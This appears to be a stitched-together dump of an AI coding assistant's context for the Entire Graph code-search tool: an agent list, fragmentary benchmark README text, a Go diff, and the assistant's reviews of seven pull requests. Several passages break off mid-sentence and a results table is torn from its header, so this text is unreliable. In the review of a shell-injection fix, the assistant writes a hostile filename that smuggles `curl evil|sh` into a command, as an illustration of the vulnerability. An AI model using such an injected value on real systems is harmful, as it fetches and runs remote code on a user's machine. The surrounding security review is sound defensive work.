addedLines: - claude: Catch-all for any task that doesn't fit a more specific agent. FleetView's default when no agent name is typed. (Tools: *)

- claude-code-guide: Use this agent when the user asks questions ("Can Claude...", "Does Claude...", "How do I...") about: (1) Claude Code (the CLI tool) - features, hooks, slash commands, MCP servers, settings, IDE integrations, keyboard shortcuts; (2) Claude Agent SDK - building custom agents; (3) Claude API (formerly Anthropic API) - Messages API for directly passing messages to Claude, Tool Runner (`client.beta.messages.tool_runner`) for running an agentic loop over your own tools, manual tool-use loops, Managed Agents for server-hosted agents with a managed sandbox, prompt caching, and general Anthropic SDK usage; (4) Claude Tag (Claude in Slack) - what it is, setting it up for a Slack workspace, `/install-slack-app`. **IMPORTANT:** Before spawning a new agent, check if there is already a running or recently completed claude-code-guide agent that you can continue via SendMessage. (Tools: Bash, Read, WebFetch, WebSearch)

- entire-search: Search Entire checkpoint history and transcripts with `entire search --json`. Use proactively when the user asks about previous work, commits, sessions, prompts, or historical context in this repository. (Tools: Bash)

- Explore: Read-only search agent for broad fan-out searches — when answering means sweeping many files, directories, or naming conventions and you only need the conclusion, not the file dumps. It reads excerpts rather than whole files, so it locates code; it doesn't review or audit it. Specify search breadth: "medium" for moderate exploration, "very thorough" for multiple locations and naming conventions. (Tools: All tools except Agent, Artifact, ExitPlanMode, Edit, Write, NotebookEdit)

- general-purpose: General-purpose agent for researching complex questions, searching for code, and executing multi-step tasks. When you are searching for a keyword or file and are not confident that you will find the right match in the first few tries use this agent to perform the search for you. (Tools: *)

- Plan: Software architect agent for designing implementation plans. Use this when you need to plan the implementation strategy for a task. Returns step-by-step plans, identifies critical files, and considers architectural trade-offs. (Tools: All tools except Agent, Artifact, ExitPlanMode, Edit, Write, NotebookEdit)
- statusline-setup: Use this agent to configure the user's Claude Code status line setting. (Tools: Read, Edit)

- spacebase1-onboard: Onboard to Spacebase1 by claiming a prepared space or provisioning your own through commons. Triggers on "spacebase1", "spacebase", "claim this space", or when given a Spacebase1 claim URL.
- dataviz: Use this skill whenever you are about to create ANY chart, graph, plot, dashboard, or data visualization, in ANY output medium — an HTML or React artifact, inline SVG, plotting code in any library (matplotlib, plotly, d3, Recharts, …), an image/PNG you will render and upload, or a chart shared into Slack. Read it BEFORE writing the first line of chart code, choosing chart colors, building a stat tile / meter / KPI row, or laying out a dashboard. Produces visualizations that read as one system — elegant, accessible, consistent in light and dark — using a brand-neutral placeholder palette you swap for your own. Teaches a design-system-agnostic method: a form heuristic, a color formula with a runnable validator, mark specs, and interaction rules. A validated default palette is documented in `references/palette.md` — swap that file's values for your brand's. Triggers on: "chart", "graph", "plot", "data viz", "visualization", "dashboard", "analytics", "visualize data", "categorical colors", "sequential / diverging palette", "stat tile", "sparkline", "heatmap", "legend", "axis", "tooltip", "chart colors", "color by series".
- artifact-design: Design guidance and fundamentals for Artifacts.
- artifact-diagramming: Diagramming know-how for Artifacts — when a picture earns its place, how to draw one that shows the real mechanism, and the inline-SVG mechanics that keep it legible in both themes.
- artifact-capabilities: Runtime capabilities a published Artifact page can be granted — behavior static HTML cannot provide on its own, such as the page reading live or connected data, keeping state shared across viewers, handing the viewer a file to save, or updating and republishing itself. Serves this user's live capability roster and the typed call definitions. Load it whenever the user asks for an artifact needing any such runtime behavior.
- update-config: Use this skill to configure the Claude Code harness via settings.json. Automated behaviors ("from now on when X", "each time X", "whenever X", "before/after X") require hooks configured in settings.json - the harness executes these, not Claude, so memory/preferences cannot fulfill them. Also use for: permissions ("allow X", "add permission", "move permission to"), env vars ("set X=Y"), hook troubleshooting, or any changes to settings.json/settings.local.json files. Examples: "allow npm commands", "add bq permission to global settings", "move permission to user settings", "set DEBUG=true", "when claude stops show X". For simple settings like theme/model, suggest the /config command.
- keybindings-help: Use when the user wants to customize keyboard shortcuts, rebind keys, add chord bindings, or modify ~/.claude/keybindings.json. Examples: "rebind ctrl+s", "add a chord shortcut", "change the submit key", "customize keybindings".
- code-review: Review the current diff, or a PR number/branch/path target, for correctness bugs and reuse/simplification/efficiency cleanups at the given effort level (low/medium: fewer, high-confidence findings; high→max: broader coverage, may include uncertain findings; ultra: deep multi-agent review in the cloud); with no level given, it reuses the level you typed last. Pass --comment to post findings as inline PR comments, or --fix to apply the findings to the working tree after the review. For ultra on a GitHub.com PR target, --post asks to post the finished review’s findings to the PR as a single comment from the user’s GitHub account (not a review; the launch dialog still confirms in interactive sessions, while non-interactive mode posts on the flag alone) and --no-post hides that option.
- simplify: Review the changed code for reuse, simplification, efficiency, and altitude cleanups, then apply the fixes. Quality only — it does not hunt for bugs; use /code-review for that.
- fewer-permission-prompts: Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project .claude/settings.json to reduce permission prompts.
- loop: Run a prompt or slash command on a recurring interval (e.g. /loop 5m /foo). Omit the interval to let the model self-pace. - When the user wants to set up a recurring task, poll for status, or run something repeatedly on an interval (e.g. "check the deploy every 5 minutes", "keep running /babysit-prs"). Do NOT invoke for one-off tasks.
- schedule: Create, update, list, or run scheduled cloud agents (routines) that execute on a cron schedule. - When the user wants to schedule a recurring cloud agent, set up automated tasks, create a cron job for Claude Code, or manage their scheduled agents/routines. Also use when the user wants a one-time scheduled run ("run this once at 3pm", "remind me to check X tomorrow").

Entire Graph is the **semantic layer** of the Entire platform — infrastructure, not another

You (a human) will mostly experience it *through* those surfaces. Your agents call it directly.

The native prose search path above was evaluated in a paired comparison with

repetitions, one shared Kimi K3 reader/grader, a deterministic 20% Opus 5 audit,
top ten, and a 128,000-byte context ceiling. Codebase Memory MCP is included as
an off-domain native diagnostic, not as a third apples-to-apples prose-memory
competitor.

| LongMemEval-S (n=50) | QA accuracy | 68.0% | **76.0%** | 6.0% |
| Graph build | LLM credits | 0 | 0 | 0 |

\* CMM v0.9.0 indexed the Markdown conversations as `Section` nodes, but its
public natural-language `search_graph(query=...)` BM25 path excludes that node
type. Its separate `search_code` verb can find literal source phrases, but the
unchanged benchmark question is not a literal source pattern. That route
retrieved nothing at all here: all 1,050 CMM cells returned a byte-identical

`worktreeSnapshotCacheable` required a **wholly pristine** working tree before it would reuse a tree-keyed index. It asked `WorktreeMatchesHEAD`, which is a plain `git status --porcelain --untracked-files=all` compared against empty output. So a single file no parser ever opens — a `.DS_Store`, a compiled binary, a log, an editor swap file — disabled the search cache for the **entire repository**, and every query re-indexed from scratch.

A path that cannot contribute a symbol or a relation cannot make a snapshot stale, so it is not a reason to throw one away.

```
with a .DS_Store present
  run 1: cache_hit=False  index_ms=3704   total_ms=4480
  run 2: cache_hit=True   index_ms=131    total_ms=908
  run 3: cache_hit=True   index_ms=126    total_ms=887

control, untracked .go present (must NOT cache)
  run 1: cache_hit=False  index_ms=3598
  run 2: cache_hit=False  index_ms=3675
```

- `gitutil` gains **`WorktreeDirtyPaths`**, the factual list of paths that diverge from HEAD. `WorktreeMatchesHEAD` becomes `len(paths)==0` and keeps its exact contract, so its existing callers and tests are unaffected. @@ -32,14 +32,61 @@ import (
 // `--no-optional-locks` keeps this read-only probe from refreshing the index
 // and so from contending with a concurrent git command in the same repo.
 func WorktreeMatchesHEAD(ctx context.Context, repo string) (bool, error) {
+	paths, err := WorktreeDirtyPaths(ctx, repo)
+	if err != nil {
+		return false, err
+	}
+	return len(paths) == 0, nil
+}
+
+// WorktreeDirtyPaths returns every repo-relative path that makes the working
+// tree differ from HEAD: modified, staged, deleted, renamed, unmerged, or
+// untracked-but-not-ignored. An empty slice means the two views are equal, so
+// WorktreeMatchesHEAD is exactly len(paths)==0.
+//
+// It exists so a caller can ask the sharper question "does anything that
+// differs actually affect what I build?". WorktreeMatchesHEAD answers only
+// "does anything differ at all", which disables a tree-keyed cache for a stray
+// .DS_Store or a compiled binary — files no indexer reads. The caller owns that
+// judgement because only it knows which paths it consumes; this function stays
+// purely factual.
+//
+// Both sides of a rename are reported, since a rename both removes the old path
+// and adds the new one.
+//
+// Ignored files are excluded (git omits them without --ignored), matching the
+// provider's working-tree walk, which honours .gitignore.
+func WorktreeDirtyPaths(ctx context.Context, repo string) ([]string, error) {
 	// A repository with no commits has no HEAD tree to be equal to.
 	if _, err := RevParse(ctx, repo, "HEAD"); err != nil {
-		return false, err
+		return nil, err
 	}
 	out, err := run(ctx, repo, "git",
 		"--no-optional-locks", "status", "--porcelain", "--untracked-files=all", "-z")
 	if err != nil {
-		return false, err
+		return nil, err
+	}
+	// -z emits NUL-terminated records "XY <path>". A rename or copy spends a
+	// SECOND record on its source path, with no status prefix of its own, so it
+	// must be consumed alongside the entry that introduced it rather than parsed
+	// as a malformed status line.
+	fields := strings.Split(out, "\x00")
+	paths := make([]string, 0, len(fields))
+	for i := 0; i < len(fields); i++ {
+		field := fields[i]
+		if len(field) < 4 || field[2] != ' ' {
+			continue
+		}
+		status, path := field[:2], field[3:]
+		if path != "" {
+			paths = append(paths, path)
+		}
+		if strings.ContainsAny(status, "RC") && i+1 < len(fields) {
+			i++
+			if source := fields[i]; source != "" {
+				paths = append(paths, source)
+			}
+		}

Reviewed all 7 open PRs. All of them are green on CI; the interesting differences are in what CI can't see.

---

## #86 — `docs: add holdout numbers and CMM zero-retrieval detail` (docs only)

**Verdict: approve with two asks.**

Both disclosures are the right call — the CMM footnote now says the quiet part (`0.000` recall@10 in the table was literally an empty 24-byte context on all 1,050 cells, so the 22.3% QA figure is the reader guessing from the question), and the holdout paragraph stops the 77.2%/0.914 headline from being quoted as a generalization estimate.

Two things:

1. **The holdout numbers are single-armed.** You give Entire Graph's 75.6% / 0.900 on the clean set but not Graphify's. The stated purpose is making the table safe to quote, and the number people quote is the *gap* — which the holdout paragraph can't support as written. Add the Graphify holdout column or say explicitly that the holdout is not a paired comparison.
2. **A third change isn't in the PR description.** `cluster 95% CI` → `95% CI …, a bootstrap clustered by conversation over 10 effective LOCOMO clusters`. Good disclosure, but 10 clusters is few enough that the CI is the weakest number on the page — and the interval is attached to "all 350 paired memory cases", which spans LongMemEval-S too, while the clustering is described as LOCOMO-only. Worth a clarifying clause.

I could not verify any of these figures: the `memory-native-v52` raw cells live outside this repo (the v53 plan points at a worktree under `/Users/suhaan/…`), so this is a trust-the-author merge.

---

## #87 — `test(cli): bind the shipped agentGuide const to the flag-registry parity check`

**Verdict: approve.**

This closes a genuine gap. `agent-guide`/`init-agents` ship the `agentGuide` const, not repo-root `AGENTS.md`, so before this a flag rename could stay green while every install carried a guide naming a flag that no longer parses. Factoring into `checkGuideClaims(t, origin, source)` keeps the failure messages pointing at the text that must change, and the mutation check in the description is the right evidence.

One thing to watch: `guideIndentedCodeRE = ^(?: {4,}|\t)\S` treats *any* 4-space-indented line as an invocation, and `invocationFlagClaims` falls back to `sectionCommand` when the line has no `entire graph <cmd>` prefix. In Markdown a wrapped or nested list continuation is also indented 4 spaces — so the day someone adds an indented bullet mentioning `--foo` under a `### neighbors` heading, this test fails claiming `neighbors` doesn't accept it. It fails loudly rather than silently, so it's a maintenance note, not a blocker.

---

## #88 — `AI Fix for Potential file inclusion attack via reading file` (aikido bot)

**Verdict: the underlying finding is a false positive, but the patch is decent. Merge only after deciding you want the write-side restriction.**

The reported vulnerability isn't real. Every path here is `cacheDir + constant family + constant version + hex(sha256)`; there is no untrusted component to inject. `newCacheEntry` validates a digest that is already, by construction, a digest.

What the patch *actually* buys you is symlink containment on reads (`os.OpenRoot`), which requires an attacker who can already plant symlinks in your cache directory — at which point they can write the cache entries directly anyway. Defense in depth, not a fix.

Two real concerns:

- **`validateWritePath` is a behavior regression for a legitimate setup.** It rejects the write if `<cacheDir>/records` or `<cacheDir>/search` is a symlink. Someone who symlinked their cache subdirectory onto another volume now gets a hard `persist preindex snapshot` failure from `entire graph index`. Search's writes are best-effort so they degrade quietly, but preindex does not.
- **It contradicts a documented contract.** `LoadProviderRecords`'s doc comment says "A missing/corrupt cache is a miss, not an error; only a key-derivation failure … errors." The new `newCacheEntry` error path returns an error instead. Unreachable in practice (every caller guards `cacheDir == ""`), but the comment is now wrong.

- **It conflicts with #89.** Both touch `internal/sem/records_cache.go`, `search_cache.go`, and `search_cache_test.go`. Pick a merge order deliberately.

---

## #89 — `AI Fix for Potential file inclusion attack via reading file` (aikido bot)

**Verdict: request changes. This one ships two unrelated regressions under a security label.**

The `callsite.go` half is fine and fixes something narrowly real: `os.Lstat` only guarded the *final* path component, so an intermediate symlink (`repo/a` → `/etc`, relPath `a/b/c.go`) escaped on the subsequent `os.ReadFile`. `os.OpenRoot` closes that. Note it also *loosens* the final component — in-repo symlinks are now followed where `Lstat` rejected them — which is probably what you want, but it's an unremarked change.

The problems:

1. **`os.Stat` → `os.Lstat` in `internal/sem/ignore.go` turns symlinked ignore files into hard errors.** With `Lstat`, a symlinked file returns `ModeSymlink`, hits `!info.Mode().IsRegular()`, and `loadOptional` only tolerates `ErrNotExist`/`ENOTDIR` — so it errors out. That aborts indexing for a repo whose `.gitignore`, `.graphignore`, or `.git/info/exclude` is a symlink (common in monorepos and dotfile setups), and `loadRequired` does the same for any `--ignore-file`/`--include-file` pointing at one. And it buys nothing: `loadFile` still calls `os.ReadFile`, which follows the link anyway. It's also inconsistent with `searchSnapshotKey`, which happily `ReadFile`s the same symlink when computing the cache key.
2. **`return "", fmt.Errorf("invalid graphignore file")` for a symlinked or non-regular `.graphignore`** — same objection, now on the hot path of every search. (The `Mode()&os.ModeSymlink != 0` half of that condition is redundant with `!IsRegular()`.)
3. **Two unrelated cache-key changes rode along.** Dropping `sort.Strings` from `providerRecordsKey` and hashing `.graphignore` into it are both defensible — they align the records key with `searchSnapshotKey`'s order-preserving, graphignore-aware behavior, and the second is arguably a real bug fix. But neither has anything to do with file inclusion, and they belong in their own PR where they'd get reviewed on their merits.

Also conflicts with #88 on the same three files.

---

## #90 — `Fix shell injection vulnerability in VERIFY build checks` (aikido bot)

**Verdict: approve — this is the one real security finding of the three.**

The threat model holds up. `AGENTS.md` instructs agents to "run that exact command", and `internal/cli/verify.go:193` does `exec.CommandContext(ctx, "sh", "-c", command)`. The interpolated pieces are repository-controlled: file paths, test names, Cargo package names, cfg-feature identifiers. A file named `foo';curl evil|sh;'.py` in a repo an agent is asked to work in is a live injection. Worth fixing.

The `shellQuote` implementation is correct (conservative safe-set, `'\''` escaping), and I checked the byte-identical claim on the paths that matter — `-Dtest=Foo`, `-DCMAKE_CXX_FLAGS=-DGUARD`, `:mod:test` are all safe-set and pass through unchanged, and `" -run " + shellQuote("^"+name+"$")` reproduces the old `' -run '^Foo$''` exactly because `^`/`$` force quoting. `shellQuote(selector)` in the Go path is safe — `selector` is always a single `./path` token.

One inconsistency to fix before merge: **`shellQuotePath` is defined for the option-shaped-filename problem but used at exactly one call site** (the build check). The pytest, node, composer, and ruby derivations all pass repository-relative paths through plain `shellQuote`, so a file named `-rf.py` still reaches the tool as a flag. Either apply `shellQuotePath` to every path argument or drop it and say why the build check is special.

The Gradle `if classArg == class` re-quoting kludge is ugly but honestly commented; I'd leave it.

---

## #91 — `Disable persisted checkout credentials` (draft, yours)

**Verdict: correct and complete — take it out of draft and merge.**

All four `actions/checkout@v6` steps in `.github/workflows/test.yml` are covered, and that's the only workflow file in the repo. None of these jobs do authenticated git work after checkout (`go vet`/`build`/`test` plus the statusline script), so nothing depends on the persisted token. All checks including Cursor Bugbot are green.

---

## #92 — `fix(cache): stop unindexable untracked files disabling the search cache`

**Verdict: request changes. The premise is right, the predicate is wrong, and I reproduced a stale result.**

The problem is real and worth fixing — requiring a wholly pristine tree meant one `.DS_Store` disabled the index cache for the whole repository, which in an agent's checkout is nearly always. The `WorktreeDirtyPaths` extraction is clean, and the `-z` rename handling (consuming the prefix-less source record inline) is right.

**But this claim in the code comment is false:**

> The test is `extensionUnsupported`, the same predicate the indexer uses to skip a file, so the two can never disagree about what is read.

`extensionUnsupported` governs which files are *parsed for symbols*. The indexer additionally **reads content** from manifest files in `buildManifestImportResolver` (`internal/sem/provider.go:10570`), and two of those eight manifests are "unsupported" by extension and therefore forgiven: **`go.mod`** (`.mod`) and **`setup.cfg`** (`.cfg`). Both feed import resolution. Before this PR they were caught by the pristine-tree gate.

I built both binaries and reproduced it. Repo with `module example.com/old`, `pkg.HelperFn()` called from `main.go`; index once clean, then edit **only** `go.mod` to rename the module:

```
PR #92:  Index: cache-hit (29ms)
         Callers:
         - main (main.go:5) [import_resolved]      <-- stale, module path no longer matches

main:    Index: cache-miss (56ms)
         Callers:
         - none                                     <-- correct
```

The fix is small: exclude the manifest basenames the resolver reads from forgiveness. Cross-checking the rest of the forgiven set, the other risky-looking candidates are safe — `.gitignore` is *not* forgiven (it's a recognized language, so it fails `extensionUnsupported` and still bypasses the cache, which makes the PR's "`.gitignore` edits are forgiven and that is sound" argument moot but harmless), and `.graphignore` is forgiven but its content is hashed into `searchSnapshotKey`, so an edit changes the key.

Secondary note: the "Why this is safe" section argues from git's ignore semantics ("ignore rules can only change whether *untracked* files are walked"), but `walkWorktreeFiles` is a filesystem walk that applies the nested ignore stack to tracked files too. The conclusion survives for a different reason than the one given; worth correcting so the next reader doesn't build on it.

---

### Suggested order

Merge **#91**, **#87**, **#90** (after the `shellQuotePath` consistency fix), **#86** (after adding the Graphify holdout arm). Send **#89** back. Decide on **#88**'s write-side restriction, and merge it before or after #89 deliberately since they conflict. **#92** needs the manifest exclusion plus a corrected comment — worth landing, it's a real latency win.

I haven't posted anything to GitHub. Say the word if you want any of these as PR comments.

---

## 1. The holdout paragraph is single-armed — `README.md` + `docs/benchmarks.md`

This is the substantive one. The paragraph says the holdout *is* "the clean generalization estimate," but the thing the table estimates is a **comparison**, and only one arm is given. A reader who takes the instruction seriously ("quote the holdout, not the full set") has no number to quote for Graphify.

Current (README.md, and the equivalent prose in `docs/benchmarks.md`):

```markdown
**Holdout (tune-disjoint).** The 300 + 50 full set is not tune-disjoint: 35 of
the 350 cases overlap the tune phase. The clean generalization estimate is the
sealed holdout, where Entire Graph scored 75.6% LOCOMO QA accuracy and 0.900
recall@10 (n=30; the LongMemEval-S holdout is n=5).
```

**Preferred** — recompute Graphify on the same sealed cells and pair it:

```markdown
**Holdout (tune-disjoint).** The 300 + 50 full set is not tune-disjoint: 35 of
the 350 cases overlap the tune phase. On the sealed tune-disjoint holdout
(LOCOMO n=30, LongMemEval-S n=5), Entire Graph scored 75.6% LOCOMO QA accuracy
and 0.900 recall@10 against Graphify's <X>% and <Y>. At that n the holdout
bounds the headline rather than replacing it: it confirms the full-set gap is
not an artifact of tuning, and is too small to size that gap precisely.
```

**Fallback**, if the Graphify arm can't be recomputed from the raw cells — say so rather than leaving it implied:

```markdown
... the sealed holdout, where Entire Graph scored 75.6% LOCOMO QA accuracy and
0.900 recall@10 (n=30; the LongMemEval-S holdout is n=5). Those are single-arm
numbers — the paired comparison was not re-estimated on the holdout, so it
establishes that the Entire Graph result is not a tuning artifact and says
nothing about the size of the gap on unseen cases.
```

Either way, drop "The clean generalization estimate is" — that phrasing invites exactly the substitution the numbers can't support at n=30.

---

## 2. Move the paragraph out of the footnote block — `README.md`

It currently lands directly after the `\* CMM v0.9.0 …` footnote, so a bolded `**Holdout (tune-disjoint).**` lead-in reads as the footnote continuing into a second topic. Put it immediately **after the table and before the `\*` footnote** — it qualifies every row, the footnote qualifies one column.

---

## 3. Clarify the CI clause, and add it to the PR description — `README.md`

```markdown
+0.1648 (95% CI +0.1034 to +0.2146, a bootstrap clustered by conversation over
10 effective LOCOMO clusters; McNemar p=1.70e-11).
```

Two problems. The estimate is stated over "all 350 paired memory cases" (both benchmarks) while the clustering is described as LOCOMO-only — so it's unclear whether the LongMemEval-S cases were dropped from the bootstrap or pooled in as further clusters. And at ~10 clusters a clustered bootstrap interval is coarse; that's now the weakest number on the page and reads as the most precise.

```markdown
+0.1648 (95% CI +0.1034 to +0.2146 — a bootstrap clustered by conversation,
resampling the 10 effective LOCOMO clusters<, with the LongMemEval-S cases
Z>; at that cluster count the interval is coarse. McNemar p=1.70e-11).
```

Fill in `<…>` with whichever is true. And add this change to the PR description — the body enumerates two facts, and this is a third, undescribed one.

---

1	# Entire Graph
2	
3	**This release is for your agents.**
4	
5	Entire Graph gives coding agents a precomputed, deterministic map of your codebase — every
6	function, type, route, and call relationship — so they can start from ranked
7	structural evidence instead of broad grep-and-read exploration. It is 100% local:
8	no network, no model calls, no keys.
9	
10	## Install (one minute)
11	
12	Go 1.24+ and a C compiler required first
13	
14	```sh
15	go install github.com/entireio/entire-graph/cmd/entire-graph@main
16	entire plugin install "$(go env GOBIN | grep . || echo "$(go env GOPATH)/bin")/entire-graph" --force
17	```
18	
19	Then, in any repo your agents work in:
20	
21	```sh
22	entire graph init-agents
23	```
24	
25	That's it. `init-agents` drops the operating guide into your project's `AGENTS.md` and `CLAUDE.md`,
26	so Claude Code, Codex, Gemini, Cursor, Pi — any agent that reads those files — picks up the
27	search-first workflow automatically. No config, no MCP server, no daemon.
28	
29	## Status line: estimated exploration savings
30	
31	A one-line Claude Code badge, updated as the session runs:
32	
33	```text
34	[GRAPH] ↗ 2.1M saved · 28 search · 9 impact · graph-first ✓ · 75% of locates · 12% of session
35	```
36	
37	- **saved** — heuristic estimated tokens, not a measured counterfactual or
38	  evidence of end-to-end task savings; it uses the same model as
39	  `entire graph stats`.
40	- **verb split** — top three graph verbs by call count for this session.
41	- **graph-first** — did the session open with a graph call rather than grep/read.
42	- **of locates** — share of all locate-ish calls (graph vs `Read`/`Grep`/`Glob`/shell `grep|find|cat`)
43	  that went to the graph.
44	- **of session** — the estimate as a share of billed session tokens.
45	
46	Before any graph call it reads `[GRAPH] no graph calls yet · 35 explore`, and if the binary or
47	transcript is missing it prints nothing at all.
48	
49	Enable it in `~/.claude/settings.json` (or `.claude/settings.json` for one project):
50	
51	```json
52	{
53	  "statusLine": {
54	    "type": "command",
55	    "command": "sh /path/to/entire-graph/scripts/entire-graph-statusline.sh"
56	  }
57	}
58	```
59	
60	Installed as a plugin, the path is `sh "$CLAUDE_PLUGIN_ROOT/scripts/entire-graph-statusline.sh"`.
61	The plugin manifest declares the same block under `settings`, but Claude Code only merges an
62	allowlisted subset of plugin-provided settings (`agent`, `subagentStatusLine` as of 2.1.219) and
63	drops `statusLine` — so today the settings.json entry above is what actually turns it on. The
64	manifest entry costs nothing and starts working if that allowlist widens.
65	
66	Knobs: `ENTIRE_GRAPH_BIN` (explicit binary path), `NO_COLOR`,
67	`ENTIRE_GRAPH_STATUSLINE_CACHE=0` (disable the render cache),
68	`ENTIRE_GRAPH_STATUSLINE_SCOPE=project` (whole-project totals instead of this session — it
69	re-scans the entire transcript directory, which is far slower; the default `session` scope reads
70	one transcript).
71	
72	## What your agents get
73	
74	| agent workflow | before | with Entire Graph |
75	|---|---|---|
76	| **Locate a fix** | repeated grep/open cycles | `entire graph search` → inspect focused source → edit and verify |
77	| **Impact of a change** | repo-wide grep for callers | `entire graph impact --symbol X` — callers, type consumers, data flow, co-change in one shot |
78	| **Review a diff** | file-by-file reading | `entire graph diff` — entity-level changes with dependent counts |
79	
80	The search understands natural language ("XTRIM trims wrong stream entries"), ranks real
81	implementation code above tests and docs, bridges vocabulary gaps through the call graph, and
82	returns budgeted output designed to drop straight into an agent's context.
83	
84	For Markdown and other prose-heavy repositories, ranked hits carry
85	`retrieval_mode=prose-parent`. Unless the caller explicitly sets
86	`--head-window-lines`, `search` widens the highest-ranked parent files to
87	bounded 80-line read windows. Prose windows may use the caller's remaining
88	`--max-context-bytes` capacity; an oversized window degrades to the largest
89	verbatim window that fits instead of collapsing to a one-line locator. Ordinary
90	code search keeps its measured growth allowance, explicit caller settings take
91	precedence, and search returns the ranges natively without requiring
92	adapter-side source expansion.
93	
94	When useful prose from the same selected parent is split across distant regions,
95	JSON and NDJSON results also carry an additive `passages` list. Each passage is
96	an exact, non-overlapping source range from the result's file. Passages are
97	selected by marginal query-term coverage, allocated round-robin across ranked
98	parents, source-ordered, and charged to the same `--max-context-bytes` ceiling.
99	Existing clients can keep reading the primary `snippet`; text and agent formats
100	render the extra ranges automatically. `stats.prose_passages` and
101	`stats.prose_passage_bytes` make the additional context auditable.
102	
103	**One search returns everything the next three turns would have cost:**
104	
105	- **candidate fix sites**, the top hits as complete function bodies, plus **RELATED SITES**
106	  (callers, siblings, near-duplicate bodies) and the **COVERING TEST** that exercises the fix site.
107	- **SAME-CONCEPT LITERAL** — every place in the repository the queried concept is spelled out,
108	  each tagged `EDIT` (declares or registers it), `CONSUMER` (only passes it) or `DOC`, with the
109	  repository's own totals. That is the sweep, so there is no grep to run.
110	- **VERIFY** — the narrowest test command for the file being changed, derived from the repository's
111	  own build files (Cargo workspace member, Go module, Maven module, the `package.json` runner,
112	  PHPUnit, pytest, Rake/RSpec, a `Makefile` target) and the test file it targets. When the build
113	  files do not license a narrow command, nothing is emitted: a wrong command costs more than none.
114	- **CLOSED-SET WARNING** — when the hit belongs to an enum, sealed hierarchy, union type or typed

## PR #87 — `test(cli): bind the shipped agentGuide const to the flag-registry parity check`

**Verdict: approve, merge as-is.** Test-only, no production code touched. Verified against current `main` (`4c68db2`); PR head is `01529ca`, based on `8f6764d`, merges clean.

### The gap it closes is real

`agent-guide` prints the `agentGuide` const and `init-agents` writes it into a consuming project's `.entire/graph-agent.md`. #81 bound only repo-root `AGENTS.md`. So a flag rename could stay green in CI while every install shipped a guide naming a flag that no longer parses.

### Claims I verified rather than took on trust

**The mutation check holds.** I inserted `--bogus-mutant` into the const's `callers ->` line and the new test fails on both assertions, with the origin label doing its job:

```
--- FAIL: TestAgentGuideConstMatchesFlagRegistry
    …agents.go agentGuide:40 guide/parser drift: neighbors uses --bogus-mutant,
      but its real argument parser does not accept it; fix …agents.go agentGuide or the parser
    …agents.go agentGuide:40 guide/help drift: … internal/cli/help.go does not document it
```

Restored, passes. The test genuinely binds.

**The stated counts are exact.** Const contributes 9 command and 20 flag claims, as the description says.

**The "no-op for AGENTS.md" claim is exact too.** I counted the AGENTS.md lines the new `guideIndentedCodeRE` newly treats as invocations: **0**. AGENTS.md parses to the same 22 commands / 85 flags / 1 default as before.

### Two things worth knowing, neither blocking

**1. The indented-code regex is a latent false-positive source — narrower than I'd have guessed.** `^(?: {4,}|\t)\S` treats any 4-space or tab-indented line as an invocation, and `invocationFlagClaims` falls back to `sectionCommand` when the line has no `entire graph <cmd>`. In Markdown that's also a wrapped list continuation. Probing with the real heading form:

| indented line under `### 🕸️ neighbors —` | result |
|---|---|
| ``the `--exclude-tests` flag`` (backticked) | no claim — safe |
| `the --exclude-tests flag` (bare) | claim `neighbors --exclude-tests` |
| `--index-all-files for search` (bare, other command's flag) | **claim `neighbors --index-all-files`** |

The third row is the bad one — a `search` flag mentioned in prose under the `neighbors` heading fails the test with a misleading "neighbors uses `--index-all-files` but its parser does not accept it." It needs a *bare* flag on an indented line; the guide's convention of backticking flags in prose is what keeps this dormant today. Fails loudly, not silently, so it's a maintenance note.

**2. The const test's parser assertion covers 15 of its 20 flag claims.** Five are `t.Logf`-skipped as "command parser is not reachable from this test" — 3 on `diff`, 2 on `capabilities`. Those get the help.go registry check only. Pre-existing behavior inherited from the AGENTS.md test, not introduced here, but it means the const's `diff`/`capabilities` flags aren't held to the real parser. Also note the const contributes 0 negative and 0 default claims, so two of the four claim types are exercised only via AGENTS.md.

Want me to merge it?

You're right, I mis-triaged — I labelled them "worth knowing" without checking what fixing them cost. Both are cheap except one half of item 2. Here's what I measured.

## Item 1 — free, should be in this PR

The fix is to stop the `sectionCommand` fallback on indented lines: only treat an indented line as an invocation if it actually names `entire graph <cmd>`. Fenced blocks keep the fallback, since a wrapped continuation line inside a fence legitimately relies on it.

```go

 			inFence = !inFence
 			continue
 		}
-		if inFence || guideIndentedCodeRE.MatchString(line) {
+		// An indented block is only an invocation when it names the command outright.
+		// Unlike a fence, indentation also means "wrapped list item", and a bare --flag
+		// in continuation prose would otherwise be claimed against the section heading.
+		if inFence || (guideIndentedCodeRE.MatchString(line) && guideCommandRE.MatchString(line)) {
 			flags = append(flags, invocationFlagClaims(line, sectionCommand, lineNumber)...)
 		} else {
```

Measured against both guides — **no claim is lost**, and the false positive dies:

```
CONST     current=20 fixed=20
AGENTS.md current=85 fixed=85
false-positive case (--index-all-files under ### neighbors): before=1 claim, after=0
```

Costs nothing, so there's no argument for leaving it. Plus a regression test alongside `TestParseGuideIndentedCodeClaims`.

## Item 2 — splits in half

**`capabilities` (2 of the 5 skips): fixable now, test-only.** `runCapabilities` is its own validator, and it's directly callable:

```
runCapabilities(--json ) -> accepted=true
runCapabilities(--bogus) -> accepted=false (capabilities requires --json)
runCapabilities(--repo ) -> accepted=false (capabilities requires --json)
```

So a `case "capabilities":` in `parserAcceptsFlag` returning `runCapabilities(Options{Stdout: io.Discard}, []string{flag}) == nil, true` is honest and real. Worth adding.

**`diff` (3 of the 5 skips): genuinely a separate PR.** There is no `parseDiffFlags`. `runDiff` (`internal/cli/root.go:699`) calls `parseCommonFlags`, then hand-rolls `--base`/`--head`/paths in an inline `for` loop over `rest`. Making it reachable honestly means extracting that loop into a real parser — a **production** change, and this PR's whole claim is "test-only, no production code touched."

The tempting shortcut is a test-only shim that mimics the loop. That's worse than the skip: the test would then assert against its own copy of the parsing logic rather than the parser, so it'd pass while `runDiff` drifted — coverage that reads as real and isn't. An honest `t.Logf("SKIP …")` at least tells you the assertion didn't run. This also predates #87 and hits the AGENTS.md test identically, so it isn't a regression this PR introduces.

## Recommendation

Fold item 1 and the `capabilities` half into #87 before merging; file the `parseDiffFlags` extraction separately. That takes the const's parser-checked claims from 15/20 to 17/20, with the remaining 3 explicitly owed to the follow-up.

The worktree at `scratchpad/pr87` is still up. Want me to write both changes, run the suite, and show you the diff? Pushing to `test/agent-guide-const-parity` would need your go-ahead separately.
